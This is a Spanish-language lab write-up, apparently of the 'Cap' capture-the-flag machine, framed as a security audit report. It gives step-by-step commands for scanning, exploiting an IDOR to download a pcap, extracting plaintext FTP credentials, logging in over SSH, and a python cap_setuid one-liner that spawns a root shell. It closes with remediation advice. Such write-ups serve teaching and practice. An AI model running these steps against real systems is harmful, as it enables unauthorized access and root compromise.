Informe de Auditoría de Seguridad: Proyecto "Cap"

ID de Objetivo: 10.129.19.33

Severidad: Crítica

Sistema Operativo: Linux (Ubuntu 20.04)

Fecha de Auditoría: 13 de abril de 2026
1. Fase de Preparación y Conectividad

La auditoría comenzó estableciendo una conexión segura a la infraestructura de laboratorio mediante una Red Privada Virtual (VPN).

    Herramienta: OpenVPN

    Comando: sudo openvpn lab_config.ovpn

    Resultado: Conectividad establecida con éxito en la interfaz tun0. Se verificó la visibilidad del objetivo mediante la herramienta ping, obteniendo un TTL de 64, lo que sugirió inicialmente un sistema operativo basado en Linux.

2. Reconocimiento y Enumeración (Reconnaissance)
2.1 Escaneo de Red con Nmap

Se ejecutó un escaneo exhaustivo para identificar puertos abiertos y versiones de servicios activos.

Comando: nmap -sC -sV -p- --min-rate 5000 10.129.19.33
Puerto	Servicio	Versión	Estado
21	FTP	vsftpd 3.0.3	Abierto
22	SSH	OpenSSH 8.2p1	Abierto
80	HTTP	Gunicorn	Abierto
2.2 Enumeración de Directorios Web (Gobuster)

Dada la presencia de un servidor web, se procedió a realizar un ataque de fuerza bruta sobre directorios y archivos para descubrir contenido oculto.

Comando: gobuster dir -u http://10.129.19.33 -w /usr/share/wordlists/dirb/common.txt

Hallazgos:

    /ip: Despliega información de red local.

    /netstat: Muestra conexiones activas.

    /data: Punto de acceso a capturas de seguridad (PCAP).

3. Identificación y Explotación del Vector de Ataque
3.1 Vulnerabilidad IDOR (Insecure Direct Object Reference)

Al interactuar con la funcionalidad de "Security Snapshot", se observó que la URL seguía el patrón http://10.129.19.33/data/5. Manipulando el parámetro numérico hacia atrás, se descubrió que el servidor no implementaba controles de autorización, permitiendo descargar el archivo 0.pcap.
3.2 Análisis de Tráfico y Fuga de Información

Se procedió a analizar el archivo descargado para buscar información sensible en protocolos no cifrados.

Comando: grep -a "PASS" 0.pcap

Resultado: Se extrajo el paquete correspondiente al protocolo FTP, revelando las credenciales en texto plano:

    Usuario: nathan

    Contraseña: Buck3tH4TF0RM3!

4. Acceso Inicial y Movimiento Lateral

Utilizando las credenciales obtenidas, se realizó un intento de inicio de sesión remoto a través del puerto 22.

Comando: ssh nathan@10.129.19.33

Estatus: Éxito. Acceso obtenido como usuario de bajos privilegios. Se recuperó el archivo de prueba de acceso inicial:

    User Flag: 

5. Escalada de Privilegios (Privilege Escalation)
5.1 Auditoría de Permisos Especiales

Se inspeccionaron las capacidades del kernel asignadas a binarios del sistema para identificar configuraciones erróneas que permitieran elevar privilegios.

Comando: getcap -r / 2>/dev/null

Hallazgo crítico: El binario de Python tenía asignada la capacidad cap_setuid.
 /usr/bin/python3.8 = cap_setuid+ep
5.2 Explotación de Capability cap_setuid

Esta configuración permite que el intérprete de Python cambie su ID de usuario al de root sin necesidad de sudo. Se ejecutó el siguiente comando para obtener una shell de administrador:

Comando: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Resultado: Acceso total al sistema como usuario root.

    Root Flag: 

6. Recomendaciones de Remediación

    Corregir el IDOR: Implementar validaciones de sesión para que los usuarios solo puedan acceder a los datos de sus propios escaneos.

    Cifrado de Comunicaciones: Migrar el servicio FTP a SFTP o FTPS para evitar la exposición de credenciales en tránsito.

    Principio de Menor Privilegio: Eliminar la capacidad cap_setuid del binario de Python (setcap -r /usr/bin/python3.8) para evitar que usuarios locales escalen privilegios.

Fin del Informe.
